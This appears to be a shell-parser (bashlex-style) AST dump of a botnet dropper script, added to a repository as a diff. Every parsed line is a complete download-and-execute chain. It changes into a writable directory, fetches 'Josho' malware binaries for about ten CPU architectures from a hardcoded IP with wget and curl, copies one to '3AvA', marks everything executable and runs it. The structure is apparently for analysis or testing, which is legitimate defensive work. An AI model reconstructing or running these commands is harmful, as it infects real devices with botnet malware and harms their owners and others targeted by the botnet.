@@ -1,0 +1,550 @@
+ListNode(lineno=2, pos=(12, 198), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 109), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 109), word='http://178.128.32.219/AB4g5/Josho.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(109, 110)),
+  CommandNode(lineno=2, pos=(111, 156), parts=[
+    WordNode(lineno=2, pos=(111, 115), word='curl'),
+    WordNode(lineno=2, pos=(116, 118), word='-O'),
+    WordNode(lineno=2, pos=(119, 156), word='http://178.128.32.219/AB4g5/Josho.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(156, 157)),
+  CommandNode(lineno=2, pos=(157, 176), parts=[
+    WordNode(lineno=2, pos=(157, 160), word='cat'),
+    WordNode(lineno=2, pos=(161, 170), word='Josho.x86'),
+    RedirectNode(lineno=2, output=
+      WordNode(lineno=2, pos=(172, 176), word='3AvA'), pos=(171, 176), type='>'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(176, 177)),
+  CommandNode(lineno=2, pos=(177, 187), parts=[
+    WordNode(lineno=2, pos=(177, 182), word='chmod'),
+    WordNode(lineno=2, pos=(183, 185), word='+x'),
+    WordNode(lineno=2, pos=(186, 187), word='*'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(187, 188)),
+  CommandNode(lineno=2, pos=(188, 198), parts=[
+    WordNode(lineno=2, pos=(188, 194), word='./3AvA'),
+    WordNode(lineno=2, pos=(195, 198), word='ssh'),
+  ]),
+])
+ListNode(lineno=3, pos=(199, 388), parts=[
+  CommandNode(lineno=3, pos=(199, 206), parts=[
+    WordNode(lineno=3, pos=(199, 201), word='cd'),
+    WordNode(lineno=3, pos=(202, 206), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(207, 209)),
+  CommandNode(lineno=3, pos=(210, 221), parts=[
+    WordNode(lineno=3, pos=(210, 212), word='cd'),
+    WordNode(lineno=3, pos=(213, 221), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(222, 224)),
+  CommandNode(lineno=3, pos=(225, 232), parts=[
+    WordNode(lineno=3, pos=(225, 227), word='cd'),
+    WordNode(lineno=3, pos=(228, 232), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(233, 235)),
+  CommandNode(lineno=3, pos=(236, 244), parts=[
+    WordNode(lineno=3, pos=(236, 238), word='cd'),
+    WordNode(lineno=3, pos=(239, 244), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(245, 247)),
+  CommandNode(lineno=3, pos=(248, 252), parts=[
+    WordNode(lineno=3, pos=(248, 250), word='cd'),
+    WordNode(lineno=3, pos=(251, 252), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(252, 253)),
+  CommandNode(lineno=3, pos=(254, 297), parts=[
+    WordNode(lineno=3, pos=(254, 258), word='wget'),
+    WordNode(lineno=3, pos=(259, 297), word='http://178.128.32.219/AB4g5/Josho.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(297, 298)),
+  CommandNode(lineno=3, pos=(299, 345), parts=[
+    WordNode(lineno=3, pos=(299, 303), word='curl'),
+    WordNode(lineno=3, pos=(304, 306), word='-O'),
+    WordNode(lineno=3, pos=(307, 345), word='http://178.128.32.219/AB4g5/Josho.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(345, 346)),
+  CommandNode(lineno=3, pos=(346, 366), parts=[
+    WordNode(lineno=3, pos=(346, 349), word='cat'),
+    WordNode(lineno=3, pos=(350, 360), word='Josho.mips'),
+    RedirectNode(lineno=3, output=
+      WordNode(lineno=3, pos=(362, 366), word='3AvA'), pos=(361, 366), type='>'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(366, 367)),
+  CommandNode(lineno=3, pos=(367, 377), parts=[
+    WordNode(lineno=3, pos=(367, 372), word='chmod'),
+    WordNode(lineno=3, pos=(373, 375), word='+x'),
+    WordNode(lineno=3, pos=(376, 377), word='*'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(377, 378)),
+  CommandNode(lineno=3, pos=(378, 388), parts=[
+    WordNode(lineno=3, pos=(378, 384), word='./3AvA'),
+    WordNode(lineno=3, pos=(385, 388), word='ssh'),
+  ]),
+])
+ListNode(lineno=4, pos=(389, 578), parts=[
+  CommandNode(lineno=4, pos=(389, 396), parts=[
+    WordNode(lineno=4, pos=(389, 391), word='cd'),
+    WordNode(lineno=4, pos=(392, 396), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(397, 399)),
+  CommandNode(lineno=4, pos=(400, 411), parts=[
+    WordNode(lineno=4, pos=(400, 402), word='cd'),
+    WordNode(lineno=4, pos=(403, 411), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(412, 414)),
+  CommandNode(lineno=4, pos=(415, 422), parts=[
+    WordNode(lineno=4, pos=(415, 417), word='cd'),
+    WordNode(lineno=4, pos=(418, 422), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(423, 425)),
+  CommandNode(lineno=4, pos=(426, 434), parts=[
+    WordNode(lineno=4, pos=(426, 428), word='cd'),
+    WordNode(lineno=4, pos=(429, 434), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(435, 437)),
+  CommandNode(lineno=4, pos=(438, 442), parts=[
+    WordNode(lineno=4, pos=(438, 440), word='cd'),
+    WordNode(lineno=4, pos=(441, 442), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(442, 443)),
+  CommandNode(lineno=4, pos=(444, 487), parts=[
+    WordNode(lineno=4, pos=(444, 448), word='wget'),
+    WordNode(lineno=4, pos=(449, 487), word='http://178.128.32.219/AB4g5/Josho.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(487, 488)),
+  CommandNode(lineno=4, pos=(489, 535), parts=[
+    WordNode(lineno=4, pos=(489, 493), word='curl'),
+    WordNode(lineno=4, pos=(494, 496), word='-O'),
+    WordNode(lineno=4, pos=(497, 535), word='http://178.128.32.219/AB4g5/Josho.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(535, 536)),
+  CommandNode(lineno=4, pos=(536, 556), parts=[
+    WordNode(lineno=4, pos=(536, 539), word='cat'),
+    WordNode(lineno=4, pos=(540, 550), word='Josho.mpsl'),
+    RedirectNode(lineno=4, output=
+      WordNode(lineno=4, pos=(552, 556), word='3AvA'), pos=(551, 556), type='>'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(556, 557)),
+  CommandNode(lineno=4, pos=(557, 567), parts=[
+    WordNode(lineno=4, pos=(557, 562), word='chmod'),
+    WordNode(lineno=4, pos=(563, 565), word='+x'),
+    WordNode(lineno=4, pos=(566, 567), word='*'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(567, 568)),
+  CommandNode(lineno=4, pos=(568, 578), parts=[
+    WordNode(lineno=4, pos=(568, 574), word='./3AvA'),
+    WordNode(lineno=4, pos=(575, 578), word='ssh'),
+  ]),
+])
+ListNode(lineno=5, pos=(579, 768), parts=[
+  CommandNode(lineno=5, pos=(579, 586), parts=[
+    WordNode(lineno=5, pos=(579, 581), word='cd'),
+    WordNode(lineno=5, pos=(582, 586), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(587, 589)),
+  CommandNode(lineno=5, pos=(590, 601), parts=[
+    WordNode(lineno=5, pos=(590, 592), word='cd'),
+    WordNode(lineno=5, pos=(593, 601), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(602, 604)),
+  CommandNode(lineno=5, pos=(605, 612), parts=[
+    WordNode(lineno=5, pos=(605, 607), word='cd'),
+    WordNode(lineno=5, pos=(608, 612), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(613, 615)),
+  CommandNode(lineno=5, pos=(616, 624), parts=[
+    WordNode(lineno=5, pos=(616, 618), word='cd'),
+    WordNode(lineno=5, pos=(619, 624), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(625, 627)),
+  CommandNode(lineno=5, pos=(628, 632), parts=[
+    WordNode(lineno=5, pos=(628, 630), word='cd'),
+    WordNode(lineno=5, pos=(631, 632), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(632, 633)),
+  CommandNode(lineno=5, pos=(634, 677), parts=[
+    WordNode(lineno=5, pos=(634, 638), word='wget'),
+    WordNode(lineno=5, pos=(639, 677), word='http://178.128.32.219/AB4g5/Josho.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(677, 678)),
+  CommandNode(lineno=5, pos=(679, 725), parts=[
+    WordNode(lineno=5, pos=(679, 683), word='curl'),
+    WordNode(lineno=5, pos=(684, 686), word='-O'),
+    WordNode(lineno=5, pos=(687, 725), word='http://178.128.32.219/AB4g5/Josho.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(725, 726)),
+  CommandNode(lineno=5, pos=(726, 746), parts=[
+    WordNode(lineno=5, pos=(726, 729), word='cat'),
+    WordNode(lineno=5, pos=(730, 740), word='Josho.arm4'),
+    RedirectNode(lineno=5, output=
+      WordNode(lineno=5, pos=(742, 746), word='3AvA'), pos=(741, 746), type='>'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(746, 747)),
+  CommandNode(lineno=5, pos=(747, 757), parts=[
+    WordNode(lineno=5, pos=(747, 752), word='chmod'),
+    WordNode(lineno=5, pos=(753, 755), word='+x'),
+    WordNode(lineno=5, pos=(756, 757), word='*'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(757, 758)),
+  CommandNode(lineno=5, pos=(758, 768), parts=[
+    WordNode(lineno=5, pos=(758, 764), word='./3AvA'),
+    WordNode(lineno=5, pos=(765, 768), word='ssh'),
+  ]),
+])
+ListNode(lineno=6, pos=(769, 958), parts=[
+  CommandNode(lineno=6, pos=(769, 776), parts=[
+    WordNode(lineno=6, pos=(769, 771), word='cd'),
+    WordNode(lineno=6, pos=(772, 776), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(777, 779)),
+  CommandNode(lineno=6, pos=(780, 791), parts=[
+    WordNode(lineno=6, pos=(780, 782), word='cd'),
+    WordNode(lineno=6, pos=(783, 791), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(792, 794)),
+  CommandNode(lineno=6, pos=(795, 802), parts=[
+    WordNode(lineno=6, pos=(795, 797), word='cd'),
+    WordNode(lineno=6, pos=(798, 802), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(803, 805)),
+  CommandNode(lineno=6, pos=(806, 814), parts=[
+    WordNode(lineno=6, pos=(806, 808), word='cd'),
+    WordNode(lineno=6, pos=(809, 814), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(815, 817)),
+  CommandNode(lineno=6, pos=(818, 822), parts=[
+    WordNode(lineno=6, pos=(818, 820), word='cd'),
+    WordNode(lineno=6, pos=(821, 822), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(822, 823)),
+  CommandNode(lineno=6, pos=(824, 867), parts=[
+    WordNode(lineno=6, pos=(824, 828), word='wget'),
+    WordNode(lineno=6, pos=(829, 867), word='http://178.128.32.219/AB4g5/Josho.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(867, 868)),
+  CommandNode(lineno=6, pos=(869, 915), parts=[
+    WordNode(lineno=6, pos=(869, 873), word='curl'),
+    WordNode(lineno=6, pos=(874, 876), word='-O'),
+    WordNode(lineno=6, pos=(877, 915), word='http://178.128.32.219/AB4g5/Josho.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(915, 916)),
+  CommandNode(lineno=6, pos=(916, 936), parts=[
+    WordNode(lineno=6, pos=(916, 919), word='cat'),
+    WordNode(lineno=6, pos=(920, 930), word='Josho.arm5'),
+    RedirectNode(lineno=6, output=
+      WordNode(lineno=6, pos=(932, 936), word='3AvA'), pos=(931, 936), type='>'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(936, 937)),
+  CommandNode(lineno=6, pos=(937, 947), parts=[
+    WordNode(lineno=6, pos=(937, 942), word='chmod'),
+    WordNode(lineno=6, pos=(943, 945), word='+x'),
+    WordNode(lineno=6, pos=(946, 947), word='*'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(947, 948)),
+  CommandNode(lineno=6, pos=(948, 958), parts=[
+    WordNode(lineno=6, pos=(948, 954), word='./3AvA'),
+    WordNode(lineno=6, pos=(955, 958), word='ssh'),
+  ]),
+])
+ListNode(lineno=7, pos=(959, 1148), parts=[
+  CommandNode(lineno=7, pos=(959, 966), parts=[
+    WordNode(lineno=7, pos=(959, 961), word='cd'),
+    WordNode(lineno=7, pos=(962, 966), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(967, 969)),
+  CommandNode(lineno=7, pos=(970, 981), parts=[
+    WordNode(lineno=7, pos=(970, 972), word='cd'),
+    WordNode(lineno=7, pos=(973, 981), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(982, 984)),
+  CommandNode(lineno=7, pos=(985, 992), parts=[
+    WordNode(lineno=7, pos=(985, 987), word='cd'),
+    WordNode(lineno=7, pos=(988, 992), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(993, 995)),
+  CommandNode(lineno=7, pos=(996, 1004), parts=[
+    WordNode(lineno=7, pos=(996, 998), word='cd'),
+    WordNode(lineno=7, pos=(999, 1004), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1005, 1007)),
+  CommandNode(lineno=7, pos=(1008, 1012), parts=[
+    WordNode(lineno=7, pos=(1008, 1010), word='cd'),
+    WordNode(lineno=7, pos=(1011, 1012), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1012, 1013)),
+  CommandNode(lineno=7, pos=(1014, 1057), parts=[
+    WordNode(lineno=7, pos=(1014, 1018), word='wget'),
+    WordNode(lineno=7, pos=(1019, 1057), word='http://178.128.32.219/AB4g5/Josho.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1057, 1058)),
+  CommandNode(lineno=7, pos=(1059, 1105), parts=[
+    WordNode(lineno=7, pos=(1059, 1063), word='curl'),
+    WordNode(lineno=7, pos=(1064, 1066), word='-O'),
+    WordNode(lineno=7, pos=(1067, 1105), word='http://178.128.32.219/AB4g5/Josho.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1105, 1106)),
+  CommandNode(lineno=7, pos=(1106, 1126), parts=[
+    WordNode(lineno=7, pos=(1106, 1109), word='cat'),
+    WordNode(lineno=7, pos=(1110, 1120), word='Josho.arm6'),
+    RedirectNode(lineno=7, output=
+      WordNode(lineno=7, pos=(1122, 1126), word='3AvA'), pos=(1121, 1126), type='>'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1126, 1127)),
+  CommandNode(lineno=7, pos=(1127, 1137), parts=[
+    WordNode(lineno=7, pos=(1127, 1132), word='chmod'),
+    WordNode(lineno=7, pos=(1133, 1135), word='+x'),
+    WordNode(lineno=7, pos=(1136, 1137), word='*'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1137, 1138)),
+  CommandNode(lineno=7, pos=(1138, 1148), parts=[
+    WordNode(lineno=7, pos=(1138, 1144), word='./3AvA'),
+    WordNode(lineno=7, pos=(1145, 1148), word='ssh'),
+  ]),
+])
+ListNode(lineno=8, pos=(1149, 1338), parts=[
+  CommandNode(lineno=8, pos=(1149, 1156), parts=[
+    WordNode(lineno=8, pos=(1149, 1151), word='cd'),
+    WordNode(lineno=8, pos=(1152, 1156), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1157, 1159)),
+  CommandNode(lineno=8, pos=(1160, 1171), parts=[
+    WordNode(lineno=8, pos=(1160, 1162), word='cd'),
+    WordNode(lineno=8, pos=(1163, 1171), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1172, 1174)),
+  CommandNode(lineno=8, pos=(1175, 1182), parts=[
+    WordNode(lineno=8, pos=(1175, 1177), word='cd'),
+    WordNode(lineno=8, pos=(1178, 1182), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1183, 1185)),
+  CommandNode(lineno=8, pos=(1186, 1194), parts=[
+    WordNode(lineno=8, pos=(1186, 1188), word='cd'),
+    WordNode(lineno=8, pos=(1189, 1194), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1195, 1197)),
+  CommandNode(lineno=8, pos=(1198, 1202), parts=[
+    WordNode(lineno=8, pos=(1198, 1200), word='cd'),
+    WordNode(lineno=8, pos=(1201, 1202), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1202, 1203)),
+  CommandNode(lineno=8, pos=(1204, 1247), parts=[
+    WordNode(lineno=8, pos=(1204, 1208), word='wget'),
+    WordNode(lineno=8, pos=(1209, 1247), word='http://178.128.32.219/AB4g5/Josho.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1247, 1248)),
+  CommandNode(lineno=8, pos=(1249, 1295), parts=[
+    WordNode(lineno=8, pos=(1249, 1253), word='curl'),
+    WordNode(lineno=8, pos=(1254, 1256), word='-O'),
+    WordNode(lineno=8, pos=(1257, 1295), word='http://178.128.32.219/AB4g5/Josho.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1295, 1296)),
+  CommandNode(lineno=8, pos=(1296, 1316), parts=[
+    WordNode(lineno=8, pos=(1296, 1299), word='cat'),
+    WordNode(lineno=8, pos=(1300, 1310), word='Josho.arm7'),
+    RedirectNode(lineno=8, output=
+      WordNode(lineno=8, pos=(1312, 1316), word='3AvA'), pos=(1311, 1316), type='>'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1316, 1317)),
+  CommandNode(lineno=8, pos=(1317, 1327), parts=[
+    WordNode(lineno=8, pos=(1317, 1322), word='chmod'),
+    WordNode(lineno=8, pos=(1323, 1325), word='+x'),
+    WordNode(lineno=8, pos=(1326, 1327), word='*'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1327, 1328)),
+  CommandNode(lineno=8, pos=(1328, 1338), parts=[
+    WordNode(lineno=8, pos=(1328, 1334), word='./3AvA'),
+    WordNode(lineno=8, pos=(1335, 1338), word='ssh'),
+  ]),
+])
+ListNode(lineno=9, pos=(1339, 1525), parts=[
+  CommandNode(lineno=9, pos=(1339, 1346), parts=[
+    WordNode(lineno=9, pos=(1339, 1341), word='cd'),
+    WordNode(lineno=9, pos=(1342, 1346), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1347, 1349)),
+  CommandNode(lineno=9, pos=(1350, 1361), parts=[
+    WordNode(lineno=9, pos=(1350, 1352), word='cd'),
+    WordNode(lineno=9, pos=(1353, 1361), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1362, 1364)),
+  CommandNode(lineno=9, pos=(1365, 1372), parts=[
+    WordNode(lineno=9, pos=(1365, 1367), word='cd'),
+    WordNode(lineno=9, pos=(1368, 1372), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1373, 1375)),
+  CommandNode(lineno=9, pos=(1376, 1384), parts=[
+    WordNode(lineno=9, pos=(1376, 1378), word='cd'),
+    WordNode(lineno=9, pos=(1379, 1384), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1385, 1387)),
+  CommandNode(lineno=9, pos=(1388, 1392), parts=[
+    WordNode(lineno=9, pos=(1388, 1390), word='cd'),
+    WordNode(lineno=9, pos=(1391, 1392), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1392, 1393)),
+  CommandNode(lineno=9, pos=(1394, 1436), parts=[
+    WordNode(lineno=9, pos=(1394, 1398), word='wget'),
+    WordNode(lineno=9, pos=(1399, 1436), word='http://178.128.32.219/AB4g5/Josho.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1436, 1437)),
+  CommandNode(lineno=9, pos=(1438, 1483), parts=[
+    WordNode(lineno=9, pos=(1438, 1442), word='curl'),
+    WordNode(lineno=9, pos=(1443, 1445), word='-O'),
+    WordNode(lineno=9, pos=(1446, 1483), word='http://178.128.32.219/AB4g5/Josho.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1483, 1484)),
+  CommandNode(lineno=9, pos=(1484, 1503), parts=[
+    WordNode(lineno=9, pos=(1484, 1487), word='cat'),
+    WordNode(lineno=9, pos=(1488, 1497), word='Josho.ppc'),
+    RedirectNode(lineno=9, output=
+      WordNode(lineno=9, pos=(1499, 1503), word='3AvA'), pos=(1498, 1503), type='>'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1503, 1504)),
+  CommandNode(lineno=9, pos=(1504, 1514), parts=[
+    WordNode(lineno=9, pos=(1504, 1509), word='chmod'),
+    WordNode(lineno=9, pos=(1510, 1512), word='+x'),
+    WordNode(lineno=9, pos=(1513, 1514), word='*'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1514, 1515)),
+  CommandNode(lineno=9, pos=(1515, 1525), parts=[
+    WordNode(lineno=9, pos=(1515, 1521), word='./3AvA'),
+    WordNode(lineno=9, pos=(1522, 1525), word='ssh'),
+  ]),
+])
+ListNode(lineno=10, pos=(1526, 1715), parts=[
+  CommandNode(lineno=10, pos=(1526, 1533), parts=[
+    WordNode(lineno=10, pos=(1526, 1528), word='cd'),
+    WordNode(lineno=10, pos=(1529, 1533), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1534, 1536)),
+  CommandNode(lineno=10, pos=(1537, 1548), parts=[
+    WordNode(lineno=10, pos=(1537, 1539), word='cd'),
+    WordNode(lineno=10, pos=(1540, 1548), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1549, 1551)),
+  CommandNode(lineno=10, pos=(1552, 1559), parts=[
+    WordNode(lineno=10, pos=(1552, 1554), word='cd'),
+    WordNode(lineno=10, pos=(1555, 1559), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1560, 1562)),
+  CommandNode(lineno=10, pos=(1563, 1571), parts=[
+    WordNode(lineno=10, pos=(1563, 1565), word='cd'),
+    WordNode(lineno=10, pos=(1566, 1571), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1572, 1574)),
+  CommandNode(lineno=10, pos=(1575, 1579), parts=[
+    WordNode(lineno=10, pos=(1575, 1577), word='cd'),
+    WordNode(lineno=10, pos=(1578, 1579), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1579, 1580)),
+  CommandNode(lineno=10, pos=(1581, 1624), parts=[
+    WordNode(lineno=10, pos=(1581, 1585), word='wget'),
+    WordNode(lineno=10, pos=(1586, 1624), word='http://178.128.32.219/AB4g5/Josho.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1624, 1625)),
+  CommandNode(lineno=10, pos=(1626, 1672), parts=[
+    WordNode(lineno=10, pos=(1626, 1630), word='curl'),
+    WordNode(lineno=10, pos=(1631, 1633), word='-O'),
+    WordNode(lineno=10, pos=(1634, 1672), word='http://178.128.32.219/AB4g5/Josho.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1672, 1673)),
+  CommandNode(lineno=10, pos=(1673, 1693), parts=[
+    WordNode(lineno=10, pos=(1673, 1676), word='cat'),
+    WordNode(lineno=10, pos=(1677, 1687), word='Josho.m68k'),
+    RedirectNode(lineno=10, output=
+      WordNode(lineno=10, pos=(1689, 1693), word='3AvA'), pos=(1688, 1693), type='>'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1693, 1694)),
+  CommandNode(lineno=10, pos=(1694, 1704), parts=[
+    WordNode(lineno=10, pos=(1694, 1699), word='chmod'),
+    WordNode(lineno=10, pos=(1700, 1702), word='+x'),
+    WordNode(lineno=10, pos=(1703, 1704), word='*'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1704, 1705)),
+  CommandNode(lineno=10, pos=(1705, 1715), parts=[
+    WordNode(lineno=10, pos=(1705, 1711), word='./3AvA'),
+    WordNode(lineno=10, pos=(1712, 1715), word='ssh'),
+  ]),
+])
+ListNode(lineno=11, pos=(1716, 1902), parts=[
+  CommandNode(lineno=11, pos=(1716, 1723), parts=[
+    WordNode(lineno=11, pos=(1716, 1718), word='cd'),
+    WordNode(lineno=11, pos=(1719, 1723), word='/tmp'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1724, 1726)),
+  CommandNode(lineno=11, pos=(1727, 1738), parts=[
+    WordNode(lineno=11, pos=(1727, 1729), word='cd'),
+    WordNode(lineno=11, pos=(1730, 1738), word='/var/run'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1739, 1741)),
+  CommandNode(lineno=11, pos=(1742, 1749), parts=[
+    WordNode(lineno=11, pos=(1742, 1744), word='cd'),
+    WordNode(lineno=11, pos=(1745, 1749), word='/mnt'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1750, 1752)),
+  CommandNode(lineno=11, pos=(1753, 1761), parts=[
+    WordNode(lineno=11, pos=(1753, 1755), word='cd'),
+    WordNode(lineno=11, pos=(1756, 1761), word='/root'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1762, 1764)),
+  CommandNode(lineno=11, pos=(1765, 1769), parts=[
+    WordNode(lineno=11, pos=(1765, 1767), word='cd'),
+    WordNode(lineno=11, pos=(1768, 1769), word='/'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1769, 1770)),
+  CommandNode(lineno=11, pos=(1771, 1813), parts=[
+    WordNode(lineno=11, pos=(1771, 1775), word='wget'),
+    WordNode(lineno=11, pos=(1776, 1813), word='http://178.128.32.219/AB4g5/Josho.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1813, 1814)),
+  CommandNode(lineno=11, pos=(1815, 1860), parts=[
+    WordNode(lineno=11, pos=(1815, 1819), word='curl'),
+    WordNode(lineno=11, pos=(1820, 1822), word='-O'),
+    WordNode(lineno=11, pos=(1823, 1860), word='http://178.128.32.219/AB4g5/Josho.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1860, 1861)),
+  CommandNode(lineno=11, pos=(1861, 1880), parts=[
+    WordNode(lineno=11, pos=(1861, 1864), word='cat'),
+    WordNode(lineno=11, pos=(1865, 1874), word='Josho.sh4'),
+    RedirectNode(lineno=11, output=
+      WordNode(lineno=11, pos=(1876, 1880), word='3AvA'), pos=(1875, 1880), type='>'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1880, 1881)),
+  CommandNode(lineno=11, pos=(1881, 1891), parts=[
+    WordNode(lineno=11, pos=(1881, 1886), word='chmod'),
+    WordNode(lineno=11, pos=(1887, 1889), word='+x'),
+    WordNode(lineno=11, pos=(1890, 1891), word='*'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1891, 1892)),
+  CommandNode(lineno=11, pos=(1892, 1902), parts=[
+    WordNode(lineno=11, pos=(1892, 1898), word='./3AvA'),
+    WordNode(lineno=11, pos=(1899, 1902), word='ssh'),
+  ]),
+])
